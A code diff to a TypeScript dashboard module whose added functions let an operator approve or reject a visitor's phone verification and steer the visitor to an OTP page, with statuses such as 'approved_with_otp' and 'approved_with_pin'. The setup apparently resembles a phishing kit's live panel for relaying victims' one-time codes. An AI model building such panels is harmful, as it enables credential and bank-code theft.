@@ -1,26 +1,24 @@
-/**
- * Actions for handling history entries in the dashboard
- */
-
 import { updateApplication } from "./firebase-services"
 import type { HistoryEntry } from "./history-helpers"
 
 /**
- * Update the status of a history entry
+ * Update history entry status
  */
 export async function updateHistoryStatus(
   visitorId: string,
   historyId: string,
-  newStatus: "approved" | "rejected" | "approved_with_otp" | "approved_with_pin" | "resend",
+  status: "pending" | "approved" | "rejected" | "approved_with_otp" | "approved_with_pin" | "resend",
   history: HistoryEntry[]
 ): Promise<void> {
-  const updatedHistory = history.map((entry) => {
+  // Find and update the specific history entry
+  const updatedHistory = history.map(entry => {
     if (entry.id === historyId) {
-      return { ...entry, status: newStatus }
+      return { ...entry, status }
     }
     return entry
   })
   
+  // Update the history in Firebase
   await updateApplication(visitorId, { history: updatedHistory as any })
 }
 
@@ -90,6 +88,42 @@ export async function handleOtpRejection(
   // Reject OTP and notify visitor
   await updateApplication(visitorId, {
     _v5Status: "rejected"
+  })
+}
+
+/**
+ * Handle phone verification approval
+ */
+export async function handlePhoneVerificationApproval(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "approved", history)
+  
+  // Approve phone verification and proceed to next step (OTP page)
+  await updateApplication(visitorId, {
+    _v4Status: "approved" as any,
+    redirectPage: "otp" as any
+  })
+}
+
+/**
+ * Handle phone verification rejection
+ */
+export async function handlePhoneVerificationRejection(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "rejected", history)
+  
+  // Reject phone verification - close modal and allow re-entry
+  await updateApplication(visitorId, {
+    _v4Status: "rejected" as any,
+    phoneCarrier: "" // Clear carrier to allow re-selection
   })
 }
 
